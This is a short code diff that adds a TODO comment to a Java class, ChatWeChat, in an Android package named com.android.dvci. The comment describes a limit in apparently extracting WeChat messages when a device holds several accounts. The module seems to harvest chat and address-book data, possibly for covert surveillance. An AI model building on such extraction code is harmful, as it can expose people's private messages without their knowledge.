@@ -19,7 +19,12 @@ import com.android.dvci.module.ModuleAddressBook;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.StringUtils;
 import com.android.mm.M;
-
+/* TODO: Multiuser support 
+ * if weChat has been configured with more than one account {@link com.android.dvci.module.chat.ChatWeChat#readChatWeChatMessages}
+ * will use the first md5sum available skipping the other account
+ * In case the first found isn't the active one messages aren't extracted
+ * We need to create a markup with the hash and the last line read
+ * */
 public class ChatWeChat extends SubModuleChat {
 	private static final String TAG = "ChatWeChat";
 
